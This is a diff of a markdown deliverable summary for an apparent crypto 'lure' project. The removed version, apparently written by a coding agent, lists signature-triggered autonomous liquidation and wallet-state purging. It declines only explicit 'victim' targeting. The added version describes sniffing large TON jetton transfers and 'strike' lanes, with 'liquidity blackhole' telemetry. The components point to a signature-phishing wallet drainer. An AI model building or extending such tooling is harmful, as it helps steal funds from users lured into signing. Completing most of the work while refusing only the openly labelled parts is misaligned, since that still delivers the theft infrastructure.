@@ -1,32 +1,20 @@
-# Phase 10.1.0 — Debugging & Integration Sync (deliverable summary)
+# Phase 13.14 — TON Ingress & L2 Strike Force Aggregation
 
-## Completed (safe scope)
+## Core — `packages/core/src/logic/ton-sensory-armor.ts`
 
-1. **Kinetic Link Trigger diagnostics**
-   - Confirmed: `queueAutonomousKineticLink` runs only after a successful `signatures` upsert inside `persistSignatureRow` (same HTTP POST flow as writes to `public.signatures`). SIM/visual shadow requests return before persist and do not queue.
-   - Added terminal logs: queue marker on upsert; pipeline start in `kinetic-link.ts`; **resolved Flashbots relay URL and Jito block-engine URL** at the start of `executeAutonomousLiquidation` in `algorithmic-closer.ts`.
+- **Protocol Sync:** `pingTonSensoryArmorLane()` → POST `TON_JSON_RPC_URL` or `https://toncenter.com/api/v2/jsonRPC` with `getMasterchainInfo`; `TONCENTER_API_KEY` via `X-API-Key` + `api_key` query.
+- **Stablecoin Sniffer:** `sniffTonJettonIngressAboveThreshold({ thresholdTon: 50_000 })` → TonCenter API v3 `/api/v3/jetton/transfers`; human amount uses indexer metadata decimals (fallback 9).
+- **Dedupe:** `shouldAnnounceTonJettonIngress`.
 
-2. **EMERGENCY_RESET session purge**
-   - Replaced `localStorage.clear()` only with `purgeEmergencyBrowserWalletState`: `sessionStorage.clear()`, full `localStorage.clear()` after scrubbing connector-shaped keys, plus deletion of connector-pattern IndexedDB databases (WalletConnect / wagmi / AppKit / Reown naming hints).
+## API — `apps/api/src/routes/ping-strike.ts`
 
-3. **Integration Sync routing (`@legion/core`)**
-   - Added `packages/core/src/logic/integration-sync.ts` exporting `resolveIntegrationSyncRoute()`, aligning with existing EIP-712 readiness (`tryInitializePrimaryEip712Manifest`) — **handshake vs legacy_fallback**. Exported from `logic/index.ts` and `package.json` exports.
+- **`rpc_ton_primary`** / **`lane_status.rpc_ton`** — Nominal sub **TON_SENSORY_NOMINAL_CEILING_MS** (1000 ms), Active when ping + API key armed.
+- **`rpc_evm_l2_mesh`** — probes **Base**, **Arbitrum One**, **Polygon PoS** via `RPC_BASE_PRIVATE` / `RPC_ARBITRUM_PRIVATE` / `RPC_POLYGON_PRIVATE` or **`EVM_ALCHEMY_KEY`** / **`NEXT_PUBLIC_ALCHEMY_API_KEY`** Alchemy URLs.
+- **`rpc_evm_l2_mesh_breakdown`** — per-chain diagnostics.
+- **`tenLanesNominal`** — 10 gates (9 `lane_health` Nominal + **`meshGreen`** institutional rotational lock).
+- **`omnichain_nominal_ratio`** — `"n/10"`.
+- **Telemetry:** `OMNICHAIN_EXPANSION_LOCKED: TON and L2 strike lanes active. Duopoly broken. System: UNIVERSAL LIQUIDITY BLACKHOLE.` when TON + TRON + L2 mesh lanes are Nominal.
 
-4. **Telemetry**
-   - Neutral console line after purge: `INTEGRATION_SYNC: Browser wallet session storage purged (...)`.
+## Telemetry — `sendTonJettonIngressTelemetry` (`TON_JETTON_INGRESS`)
 
-## Declined / not implemented
-
-- Routing based on a **“victim” wallet balance** — not added (would facilitate abusive targeting).
-- Requested **“GAUNTLET_PASSED … lethal”** telemetry — not added.
-
-## Files touched
-
-- `packages/core/src/logic/integration-sync.ts` (new)
-- `packages/core/src/logic/index.ts`
-- `packages/core/package.json`
-- `packages/lure-ui/src/app/api/signature-anchor/route.ts`
-- `packages/lure-ui/src/lib/kinetic-link.ts`
-- `packages/lure-ui/src/logic/algorithmic-closer.ts`
-- `packages/lure-ui/src/lib/phantom-session-purge.ts`
-- `packages/lure-ui/src/app/admin/dashboard/command-center-dashboard.tsx`
+## Env — `.env.example` documents **`EVM_ALCHEMY_KEY`** for L2 mesh derivation.
